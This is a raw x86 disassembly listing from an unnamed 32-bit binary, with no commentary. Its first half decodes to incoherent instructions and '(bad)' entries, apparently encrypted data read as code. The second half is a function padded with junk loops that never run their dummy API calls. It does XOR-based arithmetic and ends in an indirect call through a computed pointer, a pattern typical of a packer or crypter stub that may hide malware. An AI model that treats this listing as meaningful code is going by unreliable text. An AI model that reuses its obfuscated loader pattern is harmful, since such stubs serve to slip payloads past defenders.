  414a40:	int    0xd0
  414a42:	sub    al,0x7e
  414a44:	jnp    0x414a4d
  414a46:	sbb    edi,edi
  414a48:	and    BYTE PTR [ecx],al
  414a4a:	cmp    edx,DWORD PTR [ecx]
  414a4c:	hlt    
  414a4d:	mov    al,0x2f
  414a4f:	xchg   edi,eax
  414a50:	jb     0x414a60
  414a52:	popa   
  414a53:	inc    eax
  414a54:	test   al,0x71
  414a56:	mov    ?,ebp
  414a58:	mov    al,0x6
  414a5a:	das    
  414a5b:	xchg   esi,eax
  414a5c:	lea    ebx,[edx+ebp*8]
  414a5f:	sbb    edi,DWORD PTR [ebx]
  414a61:	fisub  DWORD PTR [esi+0x2e]
  414a64:	dec    ebp
  414a65:	inc    ebx
  414a66:	in     al,dx
  414a67:	outs   dx,DWORD PTR ds:[esi]
  414a68:	lods   eax,DWORD PTR ds:[esi]
  414a69:	push   es
  414a6a:	push   edi
  414a6b:	ins    DWORD PTR es:[edi],dx
  414a6c:	push   esi
  414a6d:	or     al,0x2d
  414a6f:	sar    cl,1
  414a71:	mov    ah,0x5b
  414a73:	lds    edi,FWORD PTR [esi]
  414a75:	or     ch,BYTE PTR [edi]
  414a77:	or     edi,esi
  414a79:	loopne 0x414ad8
  414a7b:	fsubr  st,st(6)
  414a7d:	add    al,0xd2
  414a7f:	cmp    bh,bh
  414a81:	adc    al,0x53
  414a83:	sbb    al,0xe9
  414a85:	cmp    ecx,DWORD PTR [eax-0xb2fd0ba]
  414a8b:	pushf  
  414a8c:	call   0x5d5c2e9d
  414a91:	imul   DWORD PTR [esi]
  414a93:	adc    ebp,DWORD PTR [eax+eiz*1]
  414a96:	dec    ebx
  414a97:	add    esi,DWORD PTR [edi]
  414a99:	ret    0x6040
  414a9c:	nop
  414a9d:	sbb    ah,BYTE PTR [esi-0x45]
  414aa0:	dec    edx
  414aa1:	cmp    DWORD PTR [edi],eax
  414aa3:	call   esi
  414aa5:	es and bl,al
  414aa8:	xchg   ebx,eax
  414aa9:	(bad)  
  414aaa:	cmc    
  414aab:	fwait
  414aac:	mov    ch,0xbb
  414aae:	jae    0x414ab2
  414ab0:	idiv   BYTE PTR [ebp-0x5c]
  414ab3:	imul   ebp,edx,0xb40c7f76
  414ab9:	test   eax,0xdc0d0088
  414abe:	inc    edx
  414abf:	sbb    dl,BYTE PTR [ebp+0x71]
  414ac2:	das    
  414ac3:	lock ja 0x414ae2
  414ac6:	test   BYTE PTR [ebp+0x5eee8159],0x96
  414acd:	loope  0x414a76
  414acf:	ret    0x865f
  414ad2:	les    eax,FWORD PTR [ecx]
  414ad4:	popf   
  414ad5:	cmp    DWORD PTR [ebp+0x79],ebx
  414ad8:	fst    QWORD PTR [edi-0x4d]
  414adb:	or     al,0x16
  414add:	lock mov ah,al
  414ae0:	or     al,BYTE PTR [edi+edx*8-0x78b60f4c]
  414ae7:	xchg   edi,eax
  414ae8:	jo     0x414ad8
  414aea:	loopne 0x414afd
  414aec:	mov    esp,0x1cc2cd49
  414af1:	test   al,0xd2
  414af3:	jne    0x414b33
  414af5:	dec    ebx
  414af6:	or     al,0x9b
  414af8:	mov    BYTE PTR [edx+0x5e94cd46],dl
  414afe:	into   
  414aff:	iret   
  414b00:	push   esi
  414b01:	xor    eax,eax
  414b03:	aas    
  414b04:	jne    0x414ac1
  414b06:	or     eax,0xa7a10486
  414b0b:	sub    DWORD PTR [esi+eax*2-0x61c47daa],ecx
  414b12:	loop   0x414b54
  414b14:	dec    ecx
  414b15:	and    BYTE PTR [ebp+0x6a],0xf7
  414b19:	popf   
  414b1a:	sti    
  414b1b:	xchg   DWORD PTR [ecx-0x2c],eax
  414b1e:	lds    eax,FWORD PTR [edi]
  414b20:	stos   BYTE PTR es:[edi],al
  414b21:	fs xchg edi,eax
  414b23:	dec    esi
  414b24:	fdivr  DWORD PTR [edi-0x2d95ec49]
  414b2a:	mov    ds:0x87f52bd2,eax
  414b2f:	mov    esi,0x38f88f26
  414b34:	ja     0x414b5f
  414b36:	mov    ch,0x28
  414b38:	icebp  
  414b39:	call   0x8288:0xa1d886d8
  414b40:	cmp    dh,ch
  414b42:	(bad)  
  414b43:	cmc    
  414b44:	(bad)  
  414b45:	loopne 0x414b5a
  414b47:	pop    edx
  414b48:	cld    
  414b49:	in     al,dx
  414b4a:	mov    dh,0x6
  414b4c:	test   DWORD PTR [esi-0x29],eax
  414b4f:	lahf   
  414b50:	imul   edi,DWORD PTR [ecx-0x37],0x957fed88
  414b57:	xchg   esp,eax
  414b58:	push   ss
  414b59:	add    DWORD PTR ds:0xc4bc05e3,edx
  414b5f:	adc    eax,0xa337fcce
  414b64:	aas    
  414b65:	cwde   
  414b66:	sbb    BYTE PTR [ecx+ebx*8-0xb],dh
  414b6a:	inc    ebx
  414b6b:	push   esp
  414b6c:	dec    ecx
  414b6d:	ret    0x21d7
  414b70:	bound  edx,QWORD PTR [ebx]
  414b72:	fsub   st(5),st
  414b74:	iret   
  414b75:	xchg   edx,eax
  414b76:	push   es
  414b77:	ins    BYTE PTR es:[edi],dx
  414b78:	mov    al,ds:0x810f303e
  414b7d:	jo     0x414b22
  414b7f:	test   eax,0xf5753aa0
  414b84:	nop
  414b85:	data16 icebp 
  414b87:	dec    esi
  414b88:	jge    0x414b75
  414b8a:	push   0x41952aa
  414b8f:	loopne 0x414b40
  414b91:	jno    0x414c08
  414b93:	cld    
  414b94:	gs sbb esi,0xd103d033
  414b9b:	imul   edx,ebx
  414b9e:	cmp    edx,edi
  414ba0:	jmp    0x414e28
  414ba5:	int    0xc1
  414ba7:	cmp    al,0xca
  414ba9:	int3   
  414baa:	leave  
  414bab:	aad    0xd9
  414bad:	xchg   esp,eax
  414bae:	mov    ch,0x6d
  414bb0:	dec    edx
  414bb1:	pop    DWORD PTR cs:[ebx]
  414bb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414bb5:	adc    BYTE PTR [edx],0x7f
  414bb8:	js     0x414b9f
  414bba:	jle    0x414c34
  414bbc:	js     0x414ba2
  414bbe:	and    BYTE PTR [eax+edx*2-0x6d],al
  414bc2:	mov    ebx,0xc9b3994
  414bc7:	rcr    BYTE PTR [ebp-0x1b],0x15
  414bcb:	sub    edx,edx
  414bcd:	popf   
  414bce:	fmul   DWORD PTR [ebx+0x340154fc]
  414bd4:	push   esp
  414bd5:	test   al,0xca
  414bd7:	and    DWORD PTR [eax-0x7b0fee57],esi
  414bdd:	and    eax,0x8b75c72b
  414be2:	imul   edx
  414be4:	retf   0x61e7
  414be7:	xbegin 0xa974c775
  414bed:	test   DWORD PTR [eax*4-0x4551441f],0x63356283
  414bf8:	push   0x59
  414bfa:	sub    ah,BYTE PTR [edi-0x5642c474]
  414c00:	adc    DWORD PTR [edx],0x3c
  414c03:	lods   eax,DWORD PTR ds:[esi]
  414c04:	stc    
  414c05:	adc    eax,0xe784a6eb
  414c0a:	mov    ch,0x95
  414c0c:	fcmovnb st,st(3)
  414c0e:	lea    esp,[esi+0x4b]
  414c11:	cmc    
  414c12:	gs pop ebp
  414c14:	iret   
  414c15:	mov    esp,0x8b2516d4
  414c1a:	push   0x6fbc2912
  414c1f:	int3   
  414c20:	fadd   st,st(1)
  414c22:	push   ss
  414c23:	aaa    
  414c24:	scas   eax,DWORD PTR es:[edi]
  414c25:	loope  0x414bf3
  414c27:	arpl   WORD PTR [edi-0x260380cc],bx
  414c2d:	xchg   esi,eax
  414c2e:	mov    esp,0xfac2bf64
  414c33:	xchg   ebp,eax
  414c34:	fidiv  DWORD PTR [ebx]
  414c36:	sahf   
  414c37:	mov    gs,WORD PTR [ebp+0x53]
  414c3a:	cmp    BYTE PTR [eax+0x24],cl
  414c3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c3e:	repnz icebp 
  414c40:	xchg   ebp,eax
  414c41:	mov    bl,0xf0
  414c43:	mov    ah,0x63
  414c45:	xchg   ebx,eax
  414c46:	outs   dx,DWORD PTR ds:[esi]
  414c47:	scas   al,BYTE PTR es:[edi]
  414c48:	jae    0x414c59
  414c4a:	mov    ds:0x7bfaab9b,eax
  414c4f:	test   BYTE PTR [esi+0x6bcc1fb5],al
  414c55:	jmp    0x929f:0xd3aad57e
  414c5c:	xchg   ebx,eax
  414c5d:	es xchg esi,eax
  414c5f:	lea    esp,[eax-0x7429ac12]
  414c65:	leave  
  414c66:	sub    eax,0x72be5ad1
  414c6b:	cdq    
  414c6c:	lahf   
  414c6d:	arpl   WORD PTR [edi-0x13758c63],bp
  414c73:	lods   al,BYTE PTR ds:[esi]
  414c74:	push   edx
  414c75:	bound  ebp,QWORD PTR [edi-0x55d4da4c]
  414c7b:	(bad)  [edi-0x49ea4951]
  414c81:	nop
  414c82:	pop    esp
  414c83:	gs in  al,0x6d
  414c86:	aas    
  414c87:	retf   
  414c88:	int    0x4c
  414c8a:	cs mov ebp,0x2c207eff
  414c90:	es dec edx
  414c92:	xor    dl,BYTE PTR [edi+ecx*4+0x1af4def5]
  414c99:	push   eax
  414c9a:	shr    bl,1
  414c9c:	mov    al,0x9f
  414c9e:	sbb    edx,ebx
  414ca0:	ja     0x414c4f
  414ca2:	jmp    0xb49d:0x32f97d66
  414ca9:	jmp    0x414c65
  414cab:	mov    ah,0x16
  414cad:	ds ds stc 
  414cb0:	les    eax,FWORD PTR [ecx]
  414cb2:	icebp  
  414cb3:	sub    BYTE PTR [ecx+0x39559426],ch
  414cb9:	push   esi
  414cba:	xchg   edx,eax
  414cbb:	cdq    
  414cbc:	stc    
  414cbd:	push   edx
  414cbe:	test   DWORD PTR [ebx+edi*2-0x751b0a67],esi
  414cc5:	loop   0x414d37
  414cc7:	push   eax
  414cc8:	popf   
  414cc9:	dec    eax
  414cca:	ror    BYTE PTR [eax],1
  414ccc:	(bad)  
  414ccd:	mov    ds:0xc9059bed,al
  414cd2:	xchg   edx,eax
  414cd3:	call   0x188f:0x52e70dfb
  414cda:	in     eax,dx
  414cdb:	not    ebp
  414cdd:	(bad)  
  414cde:	mov    edi,0xeb994ebd
  414ce3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ce4:	loop   0x414cb3
  414ce6:	jmp    0x2d039db
  414ceb:	xchg   edi,eax
  414cec:	xchg   esi,eax
  414ced:	push   es
  414cee:	pop    ebp
  414cef:	sub    ah,BYTE PTR [eax+0x4d601a40]
  414cf5:	sub    cl,bl
  414cf7:	jbe    0x414cf5
  414cf9:	out    0xa,eax
  414cfb:	jno    0x414d79
  414cfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414cfe:	adc    eax,0x9f9e037d
  414d03:	test   al,0x40
  414d05:	out    0x70,eax
  414d07:	push   edi
  414d08:	inc    ecx
  414d09:	popa   
  414d0a:	inc    edx
  414d0b:	push   ss
  414d0c:	inc    esp
  414d0d:	call   0x2319d88e
  414d12:	jmp    0x414d1a
  414d14:	dec    ebx
  414d15:	push   cs
  414d16:	repz dec edx
  414d18:	push   0x87bff63f
  414d1d:	dec    eax
  414d1e:	fsubr  DWORD PTR [ebx]
  414d20:	shl    BYTE PTR [eax+0x3c],0x24
  414d24:	in     al,0x1a
  414d26:	repnz cmc 
  414d28:	stc    
  414d29:	fdivr  QWORD PTR [esi-0x2996afa0]
  414d2f:	and    esi,eax
  414d31:	not    BYTE PTR [esi]
  414d33:	dec    eax
  414d34:	inc    ebx
  414d35:	xchg   ebx,eax
  414d36:	lods   eax,DWORD PTR ds:[esi]
  414d37:	mov    edx,0xe1418f8d
  414d3c:	sbb    eax,0x144fc982
  414d41:	sti    
  414d42:	jle    0x414d48
  414d44:	loop   0x414d73
  414d46:	dec    ebx
  414d47:	fisttp WORD PTR [edx+0x69]
  414d4a:	lea    ebp,[eax+0xa]
  414d4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d4e:	fisub  DWORD PTR [ebp+0x32ef5d79]
  414d54:	mov    WORD PTR [esi-0x76],es
  414d57:	leave  
  414d58:	jno    0x414d77
  414d5a:	xor    BYTE PTR [eax+0x1cbf292d],0x33
  414d61:	adc    al,al
  414d63:	add    eax,0x4d601680
  414d68:	fcomp  DWORD PTR [eax]
  414d6a:	enter  0x8dfa,0x36
  414d6e:	xor    al,0x24
  414d70:	scas   eax,DWORD PTR es:[edi]
  414d71:	add    BYTE PTR [esi],ah
  414d73:	out    0x63,eax
  414d75:	push   esi
  414d76:	jne    0x414d11
  414d78:	shl    DWORD PTR [eax],cl
  414d7a:	ins    BYTE PTR es:[edi],dx
  414d7b:	imul   ebp,DWORD PTR [edi-0x64],0x86e11e56
  414d82:	push   ecx
  414d83:	icebp  
  414d84:	fstp   QWORD PTR [eax-0xb52bca6]
  414d8a:	sbb    eax,0xce2af624
  414d8f:	sbb    BYTE PTR [ebp+0x55],al
  414d92:	push   ss
  414d93:	(bad)  
  414d94:	and    eax,0x21193298
  414d99:	pop    ds
  414d9a:	imul   eax,eax,0x312396bf
  414da0:	inc    BYTE PTR [eax+0x33]
  414da3:	cs pop es
  414da5:	push   ebp
  414da6:	ds icebp 
  414da8:	ror    BYTE PTR [ebx],1
  414daa:	arpl   ax,di
  414dac:	sub    al,0x4d
  414dae:	lods   al,BYTE PTR ds:[esi]
  414daf:	jno    0x414d84
  414db1:	das    
  414db2:	mov    dh,0x18
  414db4:	mov    dh,0x64
  414db6:	lea    ebx,[ebx]
  414db8:	(bad)  
  414db9:	fiadd  WORD PTR [ebx]
  414dbb:	xchg   edi,eax
  414dbc:	imul   esp,ebp,0xfffffff8
  414dbf:	add    BYTE PTR [ecx],bh
  414dc1:	or     BYTE PTR [eax],ah
  414dc3:	cdq    
  414dc4:	dec    ebp
  414dc5:	sar    BYTE PTR [edx+0x2e],1
  414dc8:	sub    eax,0x6b88043a
  414dcd:	push   eax
  414dce:	mov    eax,ds:0xc2934621
  414dd3:	xchg   DWORD PTR [edi+0x33e9e7ad],edx
  414dd9:	pop    ds
  414dda:	dec    BYTE PTR [ebx-0x73c22667]
  414de0:	push   cs
  414de1:	mov    bh,ch
  414de3:	xchg   esi,eax
  414de4:	gs xor al,0x27
  414de7:	mov    BYTE PTR [ecx-0x7a],0xc2
  414deb:	lods   eax,DWORD PTR ds:[esi]
  414dec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ded:	adc    BYTE PTR [edi+0x4f],ah
  414df0:	loop   0x414e0e
  414df2:	fldcw  WORD PTR [eax-0x73600800]
  414df8:	outs   dx,BYTE PTR ds:[esi]
  414df9:	in     eax,0x8b
  414dfb:	lahf   
  414dfc:	mov    ch,0x56
  414dfe:	in     al,dx
  414dff:	bound  ebx,QWORD PTR [edi+0x4f9c50a2]
  414e05:	sub    BYTE PTR [edx-0x27],cl
  414e08:	gs jmp 0x12ed4f30
  414e0e:	push   es
  414e0f:	dec    ebx
  414e10:	xchg   DWORD PTR [ebx-0x71409ccb],edi
  414e16:	push   ecx
  414e17:	and    al,0x47
  414e19:	dec    esi
  414e1a:	jmp    0x414dab
  414e1c:	and    eax,0xf60784ff
  414e21:	xchg   ebp,eax
  414e22:	mov    DWORD PTR [esi-0x1f],eax
  414e25:	pop    ebx
  414e26:	adc    eax,DWORD PTR [ecx]
  414e28:	jbe    0x40fa94
  414e2e:	pop    ebx
  414e2f:	pop    edi
  414e30:	leave  
  414e31:	ret    0x8
  414e34:	push   ebp
  414e35:	mov    ebp,esp
  414e37:	sub    esp,0xa8
  414e3d:	movzx  eax,WORD PTR ds:0x42a7f5
  414e44:	xor    DWORD PTR ds:0x42a771,eax
  414e4a:	push   ebx
  414e4b:	and    DWORD PTR ds:0x42a7b9,0x2f2e
  414e55:	push   esi
  414e56:	and    DWORD PTR ds:0x42a841,0x0
  414e60:	jmp    0x414e70
  414e65:	mov    eax,ds:0x42a841
  414e6a:	inc    eax
  414e6b:	mov    ds:0x42a841,eax
  414e70:	cmp    DWORD PTR ds:0x42a841,0x10
  414e77:	jae    0x414ea3
  414e7d:	cmp    DWORD PTR ds:0x42a841,0x12
  414e84:	jne    0x414e9e
  414e8a:	push   DWORD PTR [ebp-0x1c]
  414e8d:	push   DWORD PTR [ebp-0x10]
  414e90:	push   DWORD PTR [ebp-0x10]
  414e93:	push   0x5267
  414e98:	call   DWORD PTR ds:0x41d260
  414e9e:	jmp    0x414e65
  414ea3:	push   edi
  414ea4:	xor    esi,esi
  414ea6:	add    ecx,DWORD PTR ds:0x42a84d
  414eac:	push   0x0
  414eae:	push   0x19
  414eb0:	xor    ecx,eax
  414eb2:	pop    ecx
  414eb3:	or     eax,0x2a9a
  414eb8:	xor    edx,edx
  414eba:	sub    eax,DWORD PTR ds:0x42a801
  414ec0:	mov    eax,esi
  414ec2:	div    ecx
  414ec4:	push   edx
  414ec5:	sbb    DWORD PTR ds:0x42a7f9,0x42a831
  414ecf:	call   DWORD PTR ds:0x41d400
  414ed5:	mov    DWORD PTR ds:0x42a801,0x6c20
  414edf:	inc    esi
  414ee0:	mov    DWORD PTR ds:0x42a835,0x23c0
  414eea:	cmp    esi,0x1000
  414ef0:	jb     0x414ea6
  414ef6:	mov    DWORD PTR [ebp-0x24],0xf89c8538
  414efd:	inc    DWORD PTR ds:0x42a775
  414f03:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  414f0a:	lea    eax,[ebp-0x2c]
  414f0d:	inc    ecx
  414f0e:	mov    DWORD PTR [ebp-0x18],eax
  414f11:	and    DWORD PTR ds:0x42a845,0x42a765
  414f1b:	lea    eax,[ebp-0x30]
  414f1e:	xor    DWORD PTR ds:0x42a7b1,0x42a841
  414f28:	mov    DWORD PTR [ebp-0x14],eax
  414f2b:	or     DWORD PTR ds:0x42a801,edi
  414f31:	mov    eax,ds:0x41eae6
  414f36:	add    DWORD PTR ds:0x42a769,ebx
  414f3c:	mov    eax,DWORD PTR [eax+0x1c8]
  414f42:	mov    eax,DWORD PTR [eax]
  414f44:	and    DWORD PTR ds:0x42a7fd,0x0
  414f4e:	jmp    0x414f60
  414f53:	mov    edi,DWORD PTR ds:0x42a7fd
  414f59:	inc    edi
  414f5a:	mov    DWORD PTR ds:0x42a7fd,edi
  414f60:	cmp    DWORD PTR ds:0x42a7fd,0x11
  414f67:	jae    0x414fb6
  414f6d:	cmp    DWORD PTR ds:0x42a7fd,0x4
  414f74:	jne    0x414f8d
  414f7a:	push   0x73af
  414f7f:	push   0x42a809
  414f84:	push   DWORD PTR [ebp-0x18]
  414f87:	call   DWORD PTR ds:0x41d264
  414f8d:	cmp    DWORD PTR ds:0x42a7fd,0x3
  414f94:	jne    0x414fa7
  414f9a:	mov    edi,DWORD PTR ds:0x42a7fd
  414fa0:	inc    edi
  414fa1:	mov    DWORD PTR ds:0x42a7fd,edi
  414fa7:	jmp    0x414f53
  414fac:	mov    DWORD PTR ds:0x42a7b5,0x500e
  414fb6:	mov    ecx,DWORD PTR [ebp-0x14]
  414fb9:	and    DWORD PTR ds:0x42a7c9,0x1370
  414fc3:	mov    esi,0x7510850
  414fc8:	xor    ebx,DWORD PTR ds:0x42a76d
  414fce:	xor    eax,esi
  414fd0:	xor    edi,edi
  414fd2:	mov    edi,0x327298
  414fd7:	sub    DWORD PTR ds:0x42a845,ebx
  414fdd:	add    eax,edi
  414fdf:	mov    DWORD PTR [ecx],eax
  414fe1:	mov    DWORD PTR ds:0x42a849,edi
  414fe7:	mov    eax,ds:0x41ed1a
  414fec:	movzx  ebx,BYTE PTR ds:0x42a7b9
  414ff3:	cmp    eax,0x22c02f45
  414ff8:	mov    eax,DWORD PTR [ebp-0x4]
  414ffb:	mov    DWORD PTR ds:0x42a805,edi
  415001:	mov    ebx,0xf89c853c
  415006:	mov    DWORD PTR ds:0x42a845,0x1488
  415010:	je     0x4150a4
  415016:	and    DWORD PTR ds:0x42a849,0x0
  415020:	jmp    0x415032
  415025:	mov    ecx,DWORD PTR ds:0x42a849
  41502b:	inc    ecx
  41502c:	mov    DWORD PTR ds:0x42a849,ecx
  415032:	cmp    DWORD PTR ds:0x42a849,0x13
  415039:	jae    0x41506a
  41503f:	cmp    DWORD PTR ds:0x42a849,0x15
  415046:	jne    0x41505f
  41504c:	push   DWORD PTR [ebp-0xc]
  41504f:	push   0x7b08
  415054:	push   0x10eb
  415059:	call   DWORD PTR ds:0x41d268
  41505f:	jmp    0x415025
  415064:	or     ecx,DWORD PTR ds:0x42a871
  41506a:	mov    ecx,DWORD PTR [ebp-0x24]
  41506d:	xor    eax,esi
  41506f:	xor    DWORD PTR ds:0x42a7f1,0x57fa
  415079:	add    eax,edi
  41507b:	add    DWORD PTR ds:0x42a885,0x42a7b5
  415085:	imul   eax,ecx
  415088:	mov    DWORD PTR ds:0x42a7c1,0x7c29
  415092:	mov    DWORD PTR [ebp-0x24],eax
  415095:	mov    DWORD PTR ds:0x42a7c5,0x1f8
  41509f:	jmp    0x4152c1
  4150a4:	and    DWORD PTR ds:0x42a879,0x0
  4150ae:	mov    ecx,DWORD PTR ds:0x42a879
  4150b4:	inc    ecx
  4150b5:	mov    DWORD PTR ds:0x42a879,ecx
  4150bb:	cmp    DWORD PTR ds:0x42a879,0x2a
  4150c2:	jne    0x4150d1
  4150c8:	push   DWORD PTR [ebp-0x24]
  4150cb:	call   DWORD PTR ds:0x41d26c
  4150d1:	cmp    DWORD PTR ds:0x42a879,0x1c
  4150d8:	jb     0x4150ae
  4150de:	movzx  ecx,BYTE PTR ds:0x42a83d
  4150e5:	xor    ecx,DWORD PTR ds:0x42a84d
  4150eb:	mov    DWORD PTR ds:0x42a83d,ecx
  4150f1:	xor    eax,esi
  4150f3:	add    eax,edi
  4150f5:	and    DWORD PTR ds:0x42a7b1,edi
  4150fb:	mov    ds:0x41ebfa,eax
  415100:	neg    DWORD PTR ds:0x42a7f1
  415106:	mov    eax,DWORD PTR [ebp-0x24]
  415109:	and    DWORD PTR ds:0x42a875,0x0
  415113:	mov    ecx,DWORD PTR ds:0x42a875
  415119:	inc    ecx
  41511a:	mov    DWORD PTR ds:0x42a875,ecx
  415120:	cmp    DWORD PTR ds:0x42a875,0x29
  415127:	jne    0x415138
  41512d:	push   0x548b
  415132:	call   DWORD PTR ds:0x41d0e4
  415138:	cmp    DWORD PTR ds:0x42a875,0x1c
  41513f:	jb     0x415113
  415145:	and    DWORD PTR ds:0x42a75d,0x0
  41514f:	xor    ecx,ecx
  415151:	add    ecx,DWORD PTR ds:0x42a75d
  415157:	inc    ecx
  415158:	mov    DWORD PTR ds:0x42a75d,ecx
  41515e:	cmp    DWORD PTR ds:0x42a75d,0xe
  415165:	jne    0x415176
  41516b:	push   0x42a99f
  415170:	call   DWORD PTR ds:0x41d0e8
  415176:	cmp    DWORD PTR ds:0x42a75d,0xd
  41517d:	jne    0x415190
  415183:	mov    ecx,DWORD PTR ds:0x42a75d
  415189:	inc    ecx
  41518a:	mov    DWORD PTR ds:0x42a75d,ecx
  415190:	cmp    DWORD PTR ds:0x42a75d,0x17
  415197:	jb     0x41514f
  41519d:	or     ecx,DWORD PTR ds:0x42a781
  4151a3:	xor    eax,esi
  4151a5:	and    DWORD PTR ds:0x42a7c1,0x0
  4151af:	jmp    0x4151c1
  4151b4:	mov    ecx,DWORD PTR ds:0x42a7c1
  4151ba:	inc    ecx
  4151bb:	mov    DWORD PTR ds:0x42a7c1,ecx
  4151c1:	cmp    DWORD PTR ds:0x42a7c1,0x11
  4151c8:	jae    0x415217
  4151ce:	cmp    DWORD PTR ds:0x42a7c1,0x9
  4151d5:	jne    0x4151f4
  4151db:	push   0x577c
  4151e0:	push   DWORD PTR [ebp-0x18]
  4151e3:	push   0x838a
  4151e8:	push   DWORD PTR [ebp-0x10]
  4151eb:	push   DWORD PTR [ebp-0x28]
  4151ee:	call   DWORD PTR ds:0x41d0ec
  4151f4:	cmp    DWORD PTR ds:0x42a7c1,0x8
  4151fb:	jne    0x415210
  415201:	xor    ecx,ecx
  415203:	xor    ecx,DWORD PTR ds:0x42a7c1
  415209:	inc    ecx
  41520a:	mov    DWORD PTR ds:0x42a7c1,ecx
  415210:	jmp    0x4151b4
  415215:	not    ecx
  415217:	add    eax,edi
  415219:	and    DWORD PTR ds:0x42a7c9,0x0
  415223:	mov    ecx,DWORD PTR ds:0x42a7c9
  415229:	inc    ecx
  41522a:	mov    DWORD PTR ds:0x42a7c9,ecx
  415230:	cmp    DWORD PTR ds:0x42a7c9,0x26
  415237:	jne    0x41524b
  41523d:	push   DWORD PTR [ebp-0x20]
  415240:	push   0x2236
  415245:	call   DWORD PTR ds:0x41d270
  41524b:	cmp    DWORD PTR ds:0x42a7c9,0x16
  415252:	jb     0x415223
  415258:	mov    ds:0x41ed1a,eax
  41525d:	add    ecx,DWORD PTR ds:0x42a775
  415263:	mov    eax,DWORD PTR [ebp-0x4]
  415266:	mov    ecx,DWORD PTR ds:0x41ebfa
  41526c:	xor    eax,esi
  41526e:	xor    DWORD PTR ds:0x42a7c9,0x42a881
  415278:	add    eax,edi
  41527a:	mov    DWORD PTR ds:0x42a871,0x2781
  415284:	cmp    ecx,eax
  415286:	mov    DWORD PTR ds:0x42a841,0x2b32
  415290:	jne    0x4152c1
  415296:	mov    DWORD PTR ds:0x42a839,0x7717
  4152a0:	push   ebx
  4152a1:	sub    DWORD PTR ds:0x42a765,0x42a87d
  4152ab:	push   DWORD PTR [ebp-0x4]
  4152ae:	push   DWORD PTR [ebp-0x24]
  4152b1:	sub    DWORD PTR ds:0x42a83d,0x42a759
  4152bb:	call   DWORD PTR ds:0x41ebf2
  4152c1:	mov    eax,ds:0x41eae6
  4152c6:	mov    eax,DWORD PTR [eax+0x18c]
  4152cc:	mov    eax,DWORD PTR [eax]
  4152ce:	mov    DWORD PTR [ebp-0x44],eax
  4152d1:	mov    DWORD PTR [ebp-0x10],ebx
  4152d4:	and    DWORD PTR ds:0x42a7cd,0x0
  4152de:	jmp    0x4152f0
  4152e3:	mov    ecx,DWORD PTR ds:0x42a7cd
  4152e9:	inc    ecx
  4152ea:	mov    DWORD PTR ds:0x42a7cd,ecx
  4152f0:	cmp    DWORD PTR ds:0x42a7cd,0x1a
  4152f7:	jae    0x4153d6
  4152fd:	cmp    DWORD PTR ds:0x42a7cd,0x24
  415304:	jne    0x41531a
  41530a:	push   0x42a849
  41530f:	push   0x28eb
  415314:	call   DWORD PTR ds:0x41d0f0
  41531a:	jmp    0x4152e3
  41531f:	mov    DWORD PTR ds:0x42a781,0x10
  415329:	cmp    DWORD PTR ds:0x42a781,0x0
  415330:	je     0x4153d6
  415336:	cmp    DWORD PTR ds:0x42a781,0x7
  41533d:	jne    0x415351
  415343:	push   0x572d
  415348:	push   DWORD PTR [ebp-0xc]
  41534b:	call   DWORD PTR ds:0x41d0f4
  415351:	cmp    DWORD PTR ds:0x42a781,0x8
  415358:	jne    0x41536d
  41535e:	xor    edx,edx
  415360:	add    edx,DWORD PTR ds:0x42a781
  415366:	dec    edx
  415367:	mov    DWORD PTR ds:0x42a781,edx
  41536d:	mov    edx,DWORD PTR ds:0x42a781
  415373:	dec    edx
  415374:	mov    DWORD PTR ds:0x42a781,edx
  41537a:	jmp    0x415329
  41537f:	and    DWORD PTR ds:0x42a7f1,0x0
  415389:	jmp    0x415399
  41538e:	mov    eax,ds:0x42a7f1
  415393:	inc    eax
  415394:	mov    ds:0x42a7f1,eax
  415399:	cmp    DWORD PTR ds:0x42a7f1,0x13
  4153a0:	jae    0x4153d6
  4153a6:	cmp    DWORD PTR ds:0x42a7f1,0x1b
  4153ad:	jne    0x4153cb
  4153b3:	push   0x3cd6
  4153b8:	push   0x42a759
  4153bd:	push   DWORD PTR [ebp-0x1c]
  4153c0:	push   0x865d
  4153c5:	call   DWORD PTR ds:0x41d0f8
  4153cb:	jmp    0x41538e
  4153d0:	or     DWORD PTR ds:0x42a7bd,ecx
  4153d6:	mov    DWORD PTR [ebp-0x10],ebx
  4153d9:	mov    DWORD PTR [ebp-0x10],ebx
  4153dc:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  4153e3:	and    DWORD PTR ds:0x42a831,0x0
  4153ed:	mov    eax,ds:0x42a831
  4153f2:	inc    eax
  4153f3:	mov    ds:0x42a831,eax
  4153f8:	cmp    DWORD PTR ds:0x42a831,0xc
  4153ff:	jne    0x415416
  415405:	push   DWORD PTR [ebp-0x24]
  415408:	push   DWORD PTR [ebp-0x24]
  41540b:	push   0x42a932
  415410:	call   DWORD PTR ds:0x41d0fc
  415416:	cmp    DWORD PTR ds:0x42a831,0xb
  41541d:	jne    0x415431
  415423:	xor    eax,eax
  415425:	xor    eax,DWORD PTR ds:0x42a831
  41542b:	inc    eax
  41542c:	mov    ds:0x42a831,eax
  415431:	cmp    DWORD PTR ds:0x42a831,0x17
  415438:	jb     0x4153ed
  41543e:	adc    DWORD PTR ds:0x42a761,ecx
  415444:	mov    DWORD PTR [ebp-0x10],ebx
  415447:	mov    DWORD PTR [ebp-0x10],0xf89c8520
  41544e:	and    ecx,eax
  415450:	mov    eax,DWORD PTR [ebp-0x24]
  415453:	mov    DWORD PTR ds:0x42a88d,0x1d
  41545d:	cmp    DWORD PTR ds:0x42a88d,0x0
  415464:	je     0x4154d3
  41546a:	cmp    DWORD PTR ds:0x42a88d,0xe
  415471:	jne    0x415495
  415477:	push   DWORD PTR [ebp-0x1c]
  41547a:	push   0x42a769
  41547f:	push   DWORD PTR [ebp-0x14]
  415482:	push   0x4571
  415487:	push   0x5504
  41548c:	push   DWORD PTR [ebp-0x24]
  41548f:	call   DWORD PTR ds:0x41d100
  415495:	cmp    DWORD PTR ds:0x42a88d,0xf
  41549c:	jne    0x4154af
  4154a2:	mov    edx,DWORD PTR ds:0x42a88d
  4154a8:	dec    edx
  4154a9:	mov    DWORD PTR ds:0x42a88d,edx
  4154af:	mov    edx,DWORD PTR ds:0x42a88d
